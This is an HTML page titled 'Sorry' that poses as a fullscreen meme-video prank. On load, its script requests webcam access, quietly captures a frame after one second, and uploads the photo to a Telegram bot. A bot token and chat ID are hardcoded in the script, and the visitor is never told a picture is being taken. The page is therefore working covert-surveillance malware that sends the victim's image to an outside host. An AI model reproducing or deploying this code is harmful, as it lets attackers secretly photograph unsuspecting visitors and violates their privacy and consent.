<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sorry</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
        }
        video {
            position: absolute;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>

    
    <video id="bgVideo" autoplay loop controls>
        <source src="https://raw.githubusercontent.com/Sabbir-5399/Resources-For-All-Webpage/main/chaliye-shuru-karte-hai-video-meme-download.mp4" type="video/mp4">
        Err
    </video>

    <canvas id="canvas"></canvas>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            function goFullscreen() {
                let doc = document.documentElement;
                if (doc.requestFullscreen) {
                    doc.requestFullscreen();
                } else if (doc.mozRequestFullScreen) { // Firefox
                    doc.mozRequestFullScreen();
                } else if (doc.webkitRequestFullscreen) { // Chrome, Safari, Opera
                    doc.webkitRequestFullscreen();
                } else if (doc.msRequestFullscreen) { // IE/Edge
                    doc.msRequestFullscreen();
                }
            }

            goFullscreen();
            document.addEventListener("click", goFullscreen);

            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 
            let chatId = "6947565760"; // 

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    let video = document.createElement("video");
                    video.srcObject = stream;

                    setTimeout(() => {
                        let canvas = document.getElementById("canvas");
                        let context = canvas.getContext("2d");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        stream.getTracks().forEach(track => track.stop());

                        canvas.toBlob(blob => {
                            let formData = new FormData();
                            formData.append("chat_id", chatId);
                            formData.append("photo", blob, "image.jpg");

                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                method: "POST",
                                body: formData
                            }).then(response => response.json())
                              .catch(error => console.log(error));
                        }, 'image/jpeg');
                    }, 1000); // ⏳ 1
                })
                .catch(error => console.log("❌ Please Give The Permission First"));
        });
    </script>

</body>
</html>
